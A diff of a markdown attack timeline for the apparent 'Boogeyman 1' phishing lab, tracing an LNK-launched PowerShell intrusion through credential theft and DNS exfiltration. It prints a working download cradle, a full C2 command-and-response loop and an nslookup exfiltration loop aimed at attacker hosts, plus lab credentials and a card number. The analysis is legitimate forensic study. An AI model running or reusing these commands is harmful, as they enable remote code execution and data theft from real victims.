@@ -1,149 +1,108 @@
 # Boogeyman 1 — Attack Timeline
 
-This timeline is based on the current email, attachment, shortcut, and PowerShell endpoint evidence. Some events have exact timestamps from email headers and PowerShell logs. Manual analysis actions, such as rebuilding the attachment and running `lnkparse`, are listed in sequence order because they are analyst actions rather than attacker-executed events.
+**Case Reference:** `INC-2023-0113-BGM1`  
+**Target Organization:** Quick Logistics LLC (Finance Department)  
+**Impacted Host:** `QL-WKSTN-5693` (`10.10.182.255`)  
+**Impacted User:** Julianne Westcott (`j.westcott`)  
+
+This timeline reconstructs the entire multi-stage attack chronologically by synthesizing email metadata (`dump.eml`), endpoint PowerShell script block logs (`powershell.json`), and network packet captures (`capture.pcapng`).
 
 ---
 
-## Timeline
+## 1. Master Attack Sequence
 
-| Sequence | Time | Event | Evidence Source | Analyst Notes |
-|---|---|---|---|---|
-| 1 | 2023-01-13 09:25:26 UTC | Phishing email sent to victim | dump.eml email headers | Email was sent from Arthur Griffin using the sender address agriffin@bpakcaging.xyz to Julianne Westcott. |
-| 2 | 2023-01-13 09:25:26 UTC | Invoice/payment lure used | dump.eml subject and body | The subject was Collection for Quick Logistics LLC - Jan 2023, making the message relevant to a finance employee. |
-| 3 | 2023-01-13 09:25:26 UTC | Password-protected ZIP attachment delivered | dump.eml MIME attachment metadata | The email contained a Base64-encoded ZIP attachment named Invoice.zip. |
-| 4 | 2023-01-13 09:25:26 UTC | ZIP password provided in email body | dump.eml email body | The password Invoice2023! was included directly in the phishing message. |
-| 5 | 2023-01-13 09:25:31 UTC | Email received by Microsoft mail protection infrastructure | dump.eml Received headers | Message was received from pa80.mxout.mta1.net with sender IP 15.235.99.80. |
-| 6 | 2023-01-13 09:25:31 UTC | Microsoft Exchange recorded original arrival time | X-MS-Exchange-CrossTenant-OriginalArrivalTime header | Header showed original arrival time as 13 Jan 2023 09:25:31.6882 UTC. |
-| 7 | 2023-01-13 09:25:35 UTC | Email delivered through Outlook/Exchange infrastructure | dump.eml Received headers | Message was processed and delivered through Outlook/Exchange infrastructure. |
-| 8 | Analyst action / not logged | Base64 attachment reconstructed into ZIP archive | Manual Base64 decoding | Base64 attachment content was copied into payload.txt and decoded into Invoice.zip. |
-| 9 | Analyst action / not logged | ZIP archive extracted | ZIP extraction output | Extracting Invoice.zip with password Invoice2023! produced Invoice_20230103.lnk. |
-| 10 | Analyst action / not logged | Shortcut file analyzed | lnkparse output | The extracted LNK file was analyzed to determine execution behavior. |
-| 11 | Analyst action / not logged | Shortcut file found to reference PowerShell | lnkparse output | The shortcut referenced WindowsPowerShell v1.0 powershell.exe. |
-| 12 | Analyst action / not logged | Shortcut file used Excel-related icon path | lnkparse output | The shortcut referenced C:\Users\Administrator\Desktop\excel.ico, suggesting invoice or spreadsheet disguise. |
-| 13 | Analyst action / not logged | Shortcut configured hidden encoded PowerShell execution | lnkparse command-line arguments | Arguments included no profile, hidden window style, and encoded command execution. |
-| 14 | Analyst action / not logged | Encoded PowerShell payload decoded | Decoded Base64 payload | The decoded command attempted to download and execute remote content from files.bpakcaging.xyz. |
-| 15 | Analyst action / not logged | PowerShell download cradle identified | Decoded PowerShell command | The payload used a PowerShell download cradle to retrieve remote code from http://files.bpakcaging.xyz/update. |
-| 16 | Observed in endpoint logs / exact first execution time not yet isolated | PowerShell endpoint activity observed on compromised workstation | powershell.json | Hostname identified as QL-WKSTN-5693. Further review can isolate the earliest logged execution of the initial payload. |
-| 17 | Observed in endpoint logs / exact combined timestamp not assigned | Additional attacker infrastructure identified | PowerShell domain search | Domains cdn.bpakcaging.xyz and files.bpakcaging.xyz were observed in PowerShell logs. |
-| 18 | 2023-01-13 17:12:17.683688 UTC | Attacker loaded or downloaded Seatbelt | PowerShell Event ID 4104, Record ID 553 | Invoke-Seatbelt.ps1 was referenced from a GitHub-hosted PowerSharpPack path. |
-| 19 | 2023-01-13 17:18:05.437844 UTC | Seatbelt enumeration executed | PowerShell Event ID 4104, Record ID 630 | Seatbelt.exe was executed with a user-focused enumeration option. |
-| 20 | 2023-01-13 17:19:06.035992 UTC | Attacker located KeePass database | PowerShell Event ID 4104, Record ID 646 | Attacker checked for protected_data.kdbx in the victim user's Documents directory. |
-| 21 | 2023-01-13 17:22:47.494476 UTC | Attacker browsed Microsoft Sticky Notes package folder | PowerShell Event ID 4104, Record ID 686 | Command referenced the Microsoft Sticky Notes package directory under the victim user's AppData path. |
-| 22 | 2023-01-13 17:22:53.558146 UTC | Attacker browsed Microsoft Sticky Notes LocalState folder | PowerShell Event ID 4104, Record ID 692 | Command referenced the Sticky Notes LocalState directory where plum.sqlite is stored. |
-| 23 | 2023-01-13 17:23:38.796891 UTC | Attacker downloaded SQLite utility sq3.exe | PowerShell Event ID 4104, Record ID 703 | sq3.exe was downloaded from http://files.bpakcaging.xyz/sq3.exe. |
-| 24 | 2023-01-13 17:24:12.967200 UTC | Attacker executed sq3.exe against Sticky Notes directory | PowerShell Event ID 4104, Record ID 714 | sq3.exe was executed against the Sticky Notes LocalState directory. |
-| 25 | 2023-01-13 17:25:38.759011 UTC | Attacker queried Sticky Notes database | PowerShell Event ID 4104, Record ID 724 | sq3.exe was used to query plum.sqlite with a SELECT statement against the NOTE table. |
-| 26 | 2023-01-13 17:31:48.507719 UTC | Attacker prepared KeePass database for exfiltration | PowerShell Event ID 4104, Record ID 741 | Attacker set a file variable for protected_data.kdbx, set destination 167.71.211.113, and attempted to read file bytes. |
-| 27 | 2023-01-13 17:32:15.105474 UTC | Attacker read KeePass database as bytes using full path | PowerShell Event ID 4104, Record ID 762 | PowerShell was used to read C:\Users\j.westcott\Documents\protected_data.kdbx as bytes. |
-| 28 | 2023-01-13 17:32:23.702462 UTC | Attacker converted file bytes to hex | PowerShell Event ID 4104, Record ID 768 | File bytes were converted into hexadecimal text for transfer. |
-| 29 | 2023-01-13 17:32:41.384043 UTC | DNS-based exfiltration attempted | PowerShell Event ID 4104, Record ID 774 | nslookup was used to transmit hex-encoded chunks through DNS queries toward 167.71.211.113. |
+| Sequence | Time (UTC) | Event | Evidence Source | Technical Context & Analyst Notes |
+|:---:|:---:|---|---|---|
+| 1 | 2023-01-13 09:25:26 | Phishing email sent to victim | `dump.eml` headers | Threat actor Arthur Griffin (`agriffin@bpakcaging.xyz`) targets `julianne.westcott@hotmail.com`. |
+| 2 | 2023-01-13 09:25:26 | Invoice/payment lure used | `dump.eml` Subject & Body | Subject: `Collection for Quick Logistics LLC - Jan 2023`. Body contains payment request and embedded tracking pixel. |
+| 3 | 2023-01-13 09:25:26 | Encrypted ZIP attachment delivered | `dump.eml` MIME structure | Attached `Invoice.zip` (Base64 MIME), SHA-256: `b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87`. |
+| 4 | 2023-01-13 09:25:26 | ZIP password provided in email body | `dump.eml` body | Password `Invoice2023!` provided in plain text to evade automated sandbox detonation. |
+| 5 | 2023-01-13 09:25:31 | Email received by mail infrastructure | `dump.eml` Received headers | Routed through Elastic Email relay (`pa80.mxout.mta1.net` / `15.235.99.80`) with valid SPF and DKIM signatures. |
+| 6 | 2023-01-13 09:25:35 | Email delivered to Exchange inbox | `dump.eml` transit headers | Message delivered directly to Julianne Westcott without quarantine. |
+| 7 | [User Action] | Attachment unzipped and LNK launched | Host Artifacts | Victim extracts `Invoice.zip` with `Invoice2023!` and double-clicks `Invoice_20230103.lnk`. |
+| 8 | 2023-01-13 17:10:07 | Stage-1 fileless download cradle executed | `powershell.json` EID 4104 | Shortcut triggers `powershell.exe -nop -windowstyle hidden -enc ...` executing `Net.WebClient.DownloadString`. |
+| 9 | 2023-01-13 17:10:07 | Payload server delivers stage-2 implant | `capture.pcapng` Frame 33256 | Workstation fetches `http://files.bpakcaging.xyz/update`. Server responds `HTTP/1.1 200 OK` (`Server: SimpleHTTP/0.6 Python/3.10.7`). |
+| 10 | 2023-01-13 17:10:09 | In-memory C2 polling beacon established | `powershell.json` Record 536 / `capture.pcapng` | Workstation polls `http://cdn.bpakcaging.xyz:8080/b86459bb` every 0.8s with header `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489`. |
+| 11 | 2023-01-13 17:12:17 | Attacker attempts Seatbelt download via GitHub | `powershell.json` Record 553 | Downloads `Invoke-Seatbelt.ps1` from GitHub repository; fails due to restricted outbound access or script errors. |
+| 12 | 2023-01-13 17:18:05 | Attacker fetches and executes Seatbelt binary | `powershell.json` Record 630 | Attacker downloads `http://files.bpakcaging.xyz/sb.exe` and runs `Seatbelt.exe -group=user;pwd` for host reconnaissance. |
+| 13 | 2023-01-13 17:19:06 | Attacker locates KeePass database | `powershell.json` Record 646 | File search identifies `C:\Users\j.westcott\Documents\protected_data.kdbx`. |
+| 14 | 2023-01-13 17:22:47 | Attacker browses Sticky Notes package directory | `powershell.json` Record 686 | Inspects `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe`. |
+| 15 | 2023-01-13 17:23:38 | Attacker downloads SQLite utility `sq3.exe` | `powershell.json` Record 703 / `capture.pcapng` | Downloads `sq3.exe` from `http://files.bpakcaging.xyz/sq3.exe` via `Invoke-WebRequest`. |
+| 16 | 2023-01-13 17:25:38 | Attacker executes SQLite query on Sticky Notes | `powershell.json` Record 724 | Executes `.\Music\sq3.exe ... plum.sqlite "SELECT * from NOTE limit 100"`. |
+| 17 | 2023-01-13 17:25:39 | Sticky Notes output exfiltrated to C2 | `capture.pcapng` Frame 44467 (Stream 752) | Command output sent via `POST /27fe2489` encoded as space-delimited decimal ASCII bytes; attacker receives password `%p9^3!lL^Mz47E2GaT^y`. |
+| 18 | 2023-01-13 17:31:48 | Attacker stages KeePass database in memory | `powershell.json` Record 741 | Sets `$file='C:\Users\j.westcott\Documents\protected_data.kdbx'` and `$destination = "167.71.211.113"`. |
+| 19 | 2023-01-13 17:32:15 | File read as raw byte stream | `powershell.json` Record 762 | Invokes `[System.IO.File]::ReadAllBytes($file)`. |
+| 20 | 2023-01-13 17:32:23 | Raw bytes converted to hexadecimal | `powershell.json` Record 768 | Executes `($bytes|ForEach-Object ToString X2) -join ''` producing 4,412 hex characters. |
+| 21 | 2023-01-13 17:32:41 | Attacker launches DNS exfiltration loop | `powershell.json` Record 774 | PowerShell executes loop splitting hex into 50-character chunks: `nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113`. |
+| 22 | 2023-01-13 17:32:41 - 17:34:10 | DNS tunneling traffic observed on wire | `capture.pcapng` Frames 47772-47864 | 89 deduplicated hex chunks transmitted to rogue authoritative nameserver `167.71.211.113`. Exfiltration successful. |
+| 23 | Post-Incident Analysis | Forensic Carving of KeePass Database | `capture.pcapng` DNS Carving | DFIR team carves 2,206 bytes (`protected_data_carved.kdbx`), verifies KeePass 2.x header `03 D9 A2 9A 67 FB 4B B5`. |
+| 24 | Post-Incident Analysis | Database Decryption & Asset Confirmation | `keepassxc-cli` | Database unlocked with `%p9^3!lL^Mz47E2GaT^y`, confirming compromise of Quick Logistics corporate card `4024007128269551` (Exp: 03/2028, CVV: 970). |
 
 ---
 
-## Key Command Evidence
+## 2. Key Forensic Command Excerpts
 
-The following command excerpts support key events in the timeline. These are included outside the main table for readability.
-
-### Malicious LNK PowerShell Payload
-
+### 2.1 Fileless Stage-1 Download Cradle (LNK Payload)
 ```powershell
 iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
-````
-
-### Seatbelt Download or Load
-
-```powershell
-iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
 ```
 
-### Seatbelt Execution
-
+### 2.2 Stage-2 In-Memory C2 Polling Loop
 ```powershell
-Seatbelt.exe -group=user;pwd
+$s='cdn.bpakcaging.xyz:8080'; $i='8cce49b0-b86459bb-27fe2489'; $p='http://';
+$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i};
+while ($true) {
+    $c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content;
+    if ($c -ne 'None') {
+        $r=iex $c -ErrorAction Stop -ErrorVariable e;
+        $r=Out-String -InputObject $r;
+        $t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
+    }
+    sleep 0.8
+}
 ```
 
-### sq3.exe Download
-
+### 2.3 Credential Theft (Sticky Notes SQLite Query)
 ```powershell
 iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
-```
-
-### Sticky Notes Database Query
-
-```powershell
 .\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
 ```
 
-### KeePass Database Discovery
-
+### 2.4 Data Staging & DNS Exfiltration Loop
 ```powershell
-ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
+$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);
+$hex = ($bytes|ForEach-Object ToString X2) -join '';
+$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";
 ```
 
-### KeePass File Read
+---
 
-```powershell
-$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
-```
-
-### Hex Encoding
-
-```powershell
-$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
-```
-
-### DNS-Based Exfiltration Attempt
-
-```powershell
-for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
-```
-
-***
-
-## Current Timeline Assessment
-
-The current evidence supports the following attack chain:
+## 3. Threat Activity Flow
 
 ```text
-Phishing email
-→ Password-protected ZIP attachment
-→ Malicious LNK file
-→ Hidden encoded PowerShell
-→ Remote download and execution
-→ Endpoint enumeration
-→ Sticky Notes database access
-→ KeePass database targeting
-→ Hex encoding
-→ DNS-based exfiltration attempt
-```
-
-***
-
-## Timeline Notes
-
-* Events 1–7 are based on email header and mail-flow evidence.
-* Events 8–15 are analyst actions performed during attachment and shortcut analysis.
-* Events 16–29 are based on endpoint PowerShell log evidence.
-* The exact first endpoint execution time for the original LNK payload has not yet been fully isolated.
-* DNS exfiltration is identified as an attempted exfiltration based on PowerShell command evidence. Additional DNS/network logs would be needed to confirm whether the exfiltration fully succeeded.
-
-***
-
-## Next Actions
-
-The next stage of the investigation should focus on confirming and enriching the timeline with additional endpoint and network evidence.
-
-Items to verify next:
-
-* Exact time `Invoice_20230103.lnk` was opened or executed.
-* Parent process that launched PowerShell.
-* User account associated with initial PowerShell execution.
-* Whether `files.bpakcaging.xyz/update` was successfully downloaded.
-* Full network evidence for HTTP requests to `files.bpakcaging.xyz`.
-* DNS logs confirming whether the exfiltration attempt fully completed.
-* Any additional persistence, lateral movement, or credential access activity.
-
-```
-
-When you’re done replacing `timeline.md`, send me **“next iocs.md”** and I’ll give you the cleaned copy-paste-ready `iocs.md`.
+[Phishing Delivery via Elastic Email / 15.235.99.80]
+  │
+  ▼
+[Victim Opens Invoice.zip with 'Invoice2023!' → Clicks Invoice_20230103.lnk]
+  │
+  ▼
+[Hidden PowerShell spawned → Downloads /update from files.bpakcaging.xyz (Python SimpleHTTP/0.6)]
+  │
+  ▼
+[In-Memory C2 established with cdn.bpakcaging.xyz:8080 via header X-38d2-8f49]
+  │
+  ▼
+[Host Reconnaissance via Seatbelt.exe -group=user]
+  │
+  ▼
+[sq3.exe downloads → Queries plum.sqlite → Frame 44467 returns KeePass Master Password]
+  │
+  ▼
+[protected_data.kdbx read into memory → Converted to 4,412 hex characters]
+  │
+  ▼
+[DNS Exfiltration via nslookup → 89 chunks routed to 167.71.211.113]
+  │
+  ▼
+[DFIR Carving & Decryption → Unlocks Quick Logistics Corporate Credit Card 4024007128269551]
 ```
